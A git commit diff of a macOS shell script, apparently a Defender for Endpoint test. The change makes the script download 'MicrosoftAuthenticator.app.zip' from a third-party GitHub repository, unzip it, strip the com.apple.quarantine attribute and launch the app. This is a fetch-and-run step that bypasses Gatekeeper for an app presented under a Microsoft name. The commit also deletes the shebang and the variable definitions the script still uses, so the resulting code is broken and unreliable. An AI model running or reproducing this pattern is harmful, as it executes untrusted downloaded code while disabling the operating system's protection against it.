f9c03670d30ad44f87b2630dfc2e111ab626d8bf
Kijo <120234772+LearningKijo@users.noreply.github.com>
2023-12-18 11:20:01 +0900

    Update dev2.sh

--- GUI-MDE-API/dev2.sh
+++ GUI-MDE-API/dev2.sh
@@ -1,19 +1,8 @@
-#!/bin/bash
-
-# Specify the name of the ZIP file
-zip_file_name="Popcorn-Time-0.4.9.pkg"
-
-# Specify the full path to the ZIP file
-zip_file_path="/Users/luiza/Downloads/$zip_file_name"
-
-# Specify the name of the extracted application
-app_name="Popcorn-Time.app"
-
 # Specify the full path to the extracted application
 app_path="/Users/luiza/Downloads/$app_name"
 
 # Specify the URL to download the ZIP file
-download_url="https://github.com/popcorn-official/popcorn-desktop/releases/download/v0.4.9/Popcorn-Time-0.4.9.pkg"
+download_url="https://github.com/CYBTWR-TAMUTO/M365DShared/raw/main/MicrosoftAuthenticator.app.zip"
 
 # Download the ZIP file
 echo "Downloading the ZIP file..."
@@ -23,31 +12,31 @@ curl -L -o "$zip_file_path" "$download_url"
 if [ $? -eq 0 ]; then
     echo "Download completed successfully."
 
-    # Install the package with installer command
-    echo "Installing the package..."
-    installer -pkg "$zip_file_path" -target /
+    # Unzip the file
+    echo "Extracting the ZIP file..."
+    unzip -o "$zip_file_path" -d "/Users/luiza/Downloads/"
 
-    # Check if the installation was successful
-    if [ $? -eq 0 ]; then
-        echo "Installation completed successfully."
+    # Check if the extracted app exists
+    if [ -e "$app_path" ]; then
+        echo "Extraction completed successfully."
 
-        # Run the installed app 
-        open "/Applications/$app_name"
-
-        # Check extended attributes for Popcorn-Time.app
+        # Check extended attributes for MicrosoftAuthenticator.app
         echo "Checking extended attributes for $app_name..."
-        xattr_result=$(xattr "/Applications/$app_name")
+        xattr_result=$(xattr "$app_path")
 
         # Check if "com.apple.quarantine" is present in the extended attributes
         if [[ $xattr_result == *"com.apple.quarantine"* ]]; then
             echo "Removing 'com.apple.quarantine' attribute..."
-            xattr -d com.apple.quarantine "/Applications/$app_name"
+            xattr -d com.apple.quarantine "$app_path"
             echo "Attribute removed."
         else
             echo "No 'com.apple.quarantine' attribute found."
         fi
+
+        # Run the unzipped app 
+        open "$app_path"
     else
-        echo "Error: Installation failed."
+        echo "Error: The extracted application does not exist."
     fi
 else
     echo "Error: Download failed."
